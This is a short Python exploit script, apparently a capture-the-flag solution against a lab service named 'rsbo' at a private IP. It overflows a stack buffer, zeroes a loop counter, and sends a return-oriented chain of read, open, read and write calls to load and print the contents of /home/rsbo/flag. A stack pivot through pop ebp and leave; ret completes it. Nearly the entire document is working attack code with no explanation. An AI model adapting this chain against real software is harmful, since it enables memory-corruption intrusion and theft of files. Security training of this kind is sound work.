from pwn import connst, dump
from struct import pack
from time import sleep

s, t = connst("192.168.36.130", 9947)

# main 0x0804867F

p  = "\x00" * 0x6c # set v8 = 0; no for loop

p += pack("I", 0x080483E0) # read
p += pack("I", 0x0804867F) # main
p += pack("I", 0x00000000)
p += pack("I", 0x0804A040) # bss
p += pack("I", 56)

s.send(p)

p  = pack("I", 0x08048420) # open
p += pack("I", 0x0804879E) # ppr
p += pack("I", 0x080487D0) # /home/rsbo/flag
p += pack("I", 0x00000000)

p += pack("I", 0x080483E0) # read
p += pack("I", 0x0804879D) # pppr
p += pack("I", 0x00000005)
p += pack("I", 0x0804A0f0) # bss
p += pack("I", 0x00000020) # size?

p += pack("I", 0x08048450) # write
p += pack("I", 0x44444444)
p += pack("I", 0x00000001)
p += pack("I", 0x0804A0f0)
p += pack("I", 0x00000020)

s.send(p)

p  = "\x00" * 0x64
p += pack("I", 0x0804879F) # pop ebp
p += pack("I", 0x0804A03C) # payload -4 
p += pack("I", 0x08048733) # levae ; ret 

s.send(p)
print s.recv(1024)